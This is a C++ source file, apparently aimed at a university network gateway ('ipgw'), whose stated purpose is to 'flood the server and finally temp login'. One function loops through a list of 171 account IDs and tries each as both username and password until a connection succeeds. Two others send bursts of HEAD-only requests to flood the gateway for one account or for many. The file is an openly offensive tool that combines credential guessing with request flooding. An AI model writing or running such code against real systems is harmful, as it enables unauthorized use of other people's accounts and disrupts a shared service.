// To flood the server and finally temp login.
#include "flood.h"

// try one-by-one after the specific account.
alter_result alternate_ipgw(int index, array<string, 171> &list, int ignore, bool until_connected, bool show_status) {// if until_connected not set, will try *** until not union auth.
    int try_times = 0;
    vector<int> history;
    while (true) {
        int result = responsible_ipgw(list.at(static_cast<unsigned long>(index)), list.at(
                static_cast<unsigned long>(index)), until_connected, show_status);
        history.insert(history.end(), result);
        try_times++;
        if (until_connected && result == NETWORK_CONNECTED) {
            break;
        } else if (!until_connected && result == NOT_UNION_AUTH) {// else means until "not union auth."
            break;
        }
        if (show_status) {
            fprintf(stderr, "index=%d\n", index);
        }
        index++;
        if (index == ignore) {
            index++;
        }
        if (index > 170) {
            index = 0;
        }
    }
    alter_result result1 = {try_times, index, history};
    return result1;
}

// How to flood? The programme provide three methods. This method just means to flood.
void single_user_flood(const string &usernumber, int times, bool show_status) { // will return the last response data.
    for (int i = 1; i <= times; i++) {
        headonly_ipgw(usernumber);
        if (show_status) {
            fprintf(stderr, "headonly requests %d\r", i);
        }
    }
//    return responsible_ipgw(usernumber, usernumber, show_status);
}

void multi_user_flood(int from_index, int times, array<string, 171> &list, bool show_status) {
    for (int i = from_index; i <= from_index + times; i++) {
        headonly_ipgw(list.at(static_cast<unsigned long>(i)));
        if (show_status) {
            fprintf(stderr, "headonly requests %d\r", i);
        }
    }
}